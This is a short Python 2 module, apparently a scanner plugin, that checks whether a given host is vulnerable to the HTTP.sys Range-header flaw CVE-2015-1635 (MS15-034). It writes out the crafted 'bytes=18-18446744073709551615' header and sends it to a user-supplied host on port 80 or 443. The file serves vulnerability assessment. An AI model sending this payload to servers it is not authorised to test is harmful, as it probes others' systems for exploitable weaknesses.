# httpsysrce.py
# description: HTTP.sys in Microsoft Windows 7 SP1, Windows Server 2008 R2 SP1, Windows 8, Windows 8.1, and Windows Server 2012 Gold and R2 allows remote attackers to execute arbitrary code via crafted HTTP requests, aka "HTTP.sys Remote Code Execution Vulnerability.
# author: @shipcod3
# reference: http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2015-1635

import sys, requests, time

from datetime import datetime

class httpsysrce:

    def __init__(self, core):
        pass

    def run(self):
        # runtime recorder
        starttime = datetime.now()

        payload = "bytes=18-18446744073709551615"
        print 'Set RHOST:',
        rhost = raw_input()
        print 'Set RPORT:',
        rport = raw_input()
        print 'Set PATH / DIRECTORY:',
        path = raw_input()
        print ""
        print "[*] Starting HTTP.sys (MS15-034) Checker"
        time.sleep(2)

        if rport == '80':
            try:
                r = requests.get("http://{}/{}".format(rhost, path), headers={"Range": payload})
                print "[+] Sending the payload: " + payload + " in Range header"

                if r.status_code == 416 and 'Requested Range Not Satisfiable' in r.reason:
                    print "[+] Vulnerable"

                elif 'The request has an invalid header name' in r.reason:
                    print "[-] Not Vulnerable - Patched"

                else:
                    print "[+] Not Vulnerable"

            except Exception as e:
                print "[*] Error! Check if host is online.."

        elif rport == '443':
            try:
                r = requests.get("https://{}/{}".format(rhost, path), headers={"Range": payload})
                print "[+] Sending the payload: " + payload + " in Range header"

                if r.status_code == 416 and 'Requested Range Not Satisfiable' in r.reason:
                    print "[+] Vulnerable"

                elif 'The request has an invalid header name' in r.reason:
                    print "[-] Not Vulnerable - Patched"

                else:
                    print "[+] Not Vulnerable"

            except Exception as e:
                print "[*] Error! Check if host is online.."

        print "[!] Done...."
        time.sleep(3)
        print ""
        endtime = datetime.now()
        total = endtime - starttime
        print 'Runtime: ', total
